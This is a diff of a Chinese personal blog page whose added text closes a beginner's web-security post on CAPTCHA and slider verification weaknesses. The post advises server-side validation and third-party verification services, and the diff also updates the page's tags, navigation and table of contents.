+<h2 id="验证码和滑块验证"><a href="#验证码和滑块验证" class="headerlink" title="验证码和滑块验证"></a>验证码和滑块验证</h2><h3 id="验证码字符验证"><a href="#验证码字符验证" class="headerlink" title="验证码字符验证"></a>验证码字符验证</h3><p>目前验证码字符验证已经逐渐推出舞台，但是有一些专门这块验证服务的第三方平台，通过对验证码字符的不断改进和更新，对一些攻击者来说还是有防护作用，但是个人或企业网站还是用的一尘不变的验证方法的话，就很容易被攻击成功。很多初学者都在前台浏览器客户端用JS进行字符验证，很容易被破解跳过。好点的就在服务器进行检验，但是还是能被一些黑客经过长期的经验发明的一些工具破解。<br>这里就提及一下12306所推出的图片验证，目前已经被很多人报道也是不安全的，攻击者可以直接将图片处理后丢入google、百度的识图接口，返回的数值让人惊讶。<br> <img src="http://img.cduyzh.com/images/12306.jpg" alt="前端JS表单验证过滤|center"><br> 居然能把第二张图识别为沙县小吃，我是觉得目前的人工智能的图像识别技术很厉害，所以要不了多久这种验证方式也会被淘汰，除非不断更新图片库。</p>
+<h3 id="滑块验证"><a href="#滑块验证" class="headerlink" title="滑块验证"></a>滑块验证</h3><p>滑块验证和12306的图片识别验证目前算是比较安全的验证手段，滑动验证的核心并不是简单的拼接成功就可以过，所以也不是简单的算一下偏移量就能破解。滑动验证做的好的是通过采集你的滑动过程轨迹与服务器端的海量样本进行对比，区分人还是机器，用到了很多深度学习的技术，当然市面上也有一些滑动验证只是前端拼接就能过，大家还是要多多研究一下。</p>
+<hr>
+<blockquote>
+<p>反正如果项目需要用到验证码这块，不能考虑只在客户端进行JS验证，客户端的JS验证有的前提下，还要把数据返回到后台来进行验证，这样可以大概率保证网站安全性，网站的攻防一直是持久的话题，没有绝对的安全也没有绝对的攻击。推荐大家多尝试网上的第三方服务商提供的验证服务，这样节省自己的精力来研究验证漏洞以及频繁的更新验证方法。</p>
+</blockquote>
+<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>在校期间第一次认识到web安全重要性，目前只是初步的认识，如果后面了解了更多相关的知识，会继续做补充。关于hexo搭建的博客的技术应该不会再出什么文章了，有需要了解其他的知识的，会有困难的可以联系我或下方留言，然后看情况是否整理为一篇文章来集中回答帮助其他人。</p>
 
       
     </div>
@@ -526,7 +596,7 @@
   
     <div class="copyright">
     <p><span>
-    <b>本文地址：</b><a href="/img-oss/" title="解决博客图片存储——阿里云的OSS运用">http://www.cduyzh.com/img-oss/</a><br/><b>转载请注明出处，谢谢！</b>
+    <b>本文地址：</b><a href="/js-validate-code/" title="Web安全——前端JS表单验证过滤">http://www.cduyzh.com/js-validate-code/</a><br/><b>转载请注明出处，谢谢！</b>
     </span></p>
     </div>
   
@@ -564,11 +634,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/hexo/" rel="tag"># hexo</a>
+            <a href="/tags/JS/" rel="tag"># JS</a>
           
-            <a href="/tags/optimization/" rel="tag"># optimization</a>
+            <a href="/tags/HTML/" rel="tag"># HTML</a>
           
-            <a href="/tags/image/" rel="tag"># image</a>
+            <a href="/tags/Web-Security/" rel="tag"># Web Security</a>
           
         </div>
       
@@ -581,8 +651,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/hexo-settings-7/" rel="next" title="多说评论关闭服务后迁移到网易云跟帖">
-                <i class="fa fa-chevron-left"></i> 多说评论关闭服务后迁移到网易云跟帖
+              <a href="/img-oss/" rel="next" title="解决博客图片存储——阿里云的OSS运用">
+                <i class="fa fa-chevron-left"></i> 解决博客图片存储——阿里云的OSS运用
               </a>
             
           </div>
@@ -590,10 +660,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/js-validate-code/" rel="prev" title="Web安全——前端JS表单验证过滤">
-                Web安全——前端JS表单验证过滤 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -823,7 +889,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原因"><span class="nav-number">2.</span> <span class="nav-text">原因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#github-pages容量受限"><span class="nav-number">2.1.</span> <span class="nav-text">github pages容量受限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图床访问速度快"><span class="nav-number">2.2.</span> <span class="nav-text">图床访问速度快</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#前瞻性"><span class="nav-number">2.3.</span> <span class="nav-text">前瞻性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#个人原因"><span class="nav-number">2.4.</span> <span class="nav-text">个人原因</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对比分析"><span class="nav-number">3.</span> <span class="nav-text">对比分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#存储空间费用"><span class="nav-number">3.1.</span> <span class="nav-text">存储空间费用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#流量费用"><span class="nav-number">3.2.</span> <span class="nav-text">流量费用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">3.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用OSS"><span class="nav-number">4.</span> <span class="nav-text">使用OSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进入控制台"><span class="nav-number">4.1.</span> <span class="nav-text">进入控制台</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图片链接地址优化"><span class="nav-number">5.</span> <span class="nav-text">图片链接地址优化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图片在线压缩网站"><span class="nav-number">6.</span> <span class="nav-text">图片在线压缩网站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OSS管理工具"><span class="nav-number">7.</span> <span class="nav-text">OSS管理工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#End"><span class="nav-number">8.</span> <span class="nav-text">End</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#原因"><span class="nav-number">2.</span> <span class="nav-text">原因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安全小白"><span class="nav-number">2.1.</span> <span class="nav-text">安全小白</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web常见攻击手段"><span class="nav-number">3.</span> <span class="nav-text">web常见攻击手段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#跨站脚本攻击（XSS）"><span class="nav-number">3.1.</span> <span class="nav-text">跨站脚本攻击（XSS）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie劫持"><span class="nav-number">3.2.</span> <span class="nav-text">Cookie劫持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS的防御"><span class="nav-number">4.</span> <span class="nav-text">XSS的防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入"><span class="nav-number">5.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入的防御"><span class="nav-number">6.</span> <span class="nav-text">SQL注入的防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跨站请求伪造（CSRF）"><span class="nav-number">7.</span> <span class="nav-text">跨站请求伪造（CSRF）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF的防御"><span class="nav-number">8.</span> <span class="nav-text">CSRF的防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#点击劫持（ClickJacking）"><span class="nav-number">9.</span> <span class="nav-text">点击劫持（ClickJacking）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我的方法"><span class="nav-number">10.</span> <span class="nav-text">我的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言-1"><span class="nav-number">10.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#登录的字符检测"><span class="nav-number">10.2.</span> <span class="nav-text">登录的字符检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#密码MD5加密"><span class="nav-number">10.3.</span> <span class="nav-text">密码MD5加密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后台添加修改信息的字符检测"><span class="nav-number">10.4.</span> <span class="nav-text">后台添加修改信息的字符检测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#验证码和滑块验证"><span class="nav-number">11.</span> <span class="nav-text">验证码和滑块验证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证码字符验证"><span class="nav-number">11.1.</span> <span class="nav-text">验证码字符验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#滑块验证"><span class="nav-number">11.2.</span> <span class="nav-text">滑块验证</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#End"><span class="nav-number">12.</span> <span class="nav-text">End</span></a></li></ol></div>
             
 
           </div>
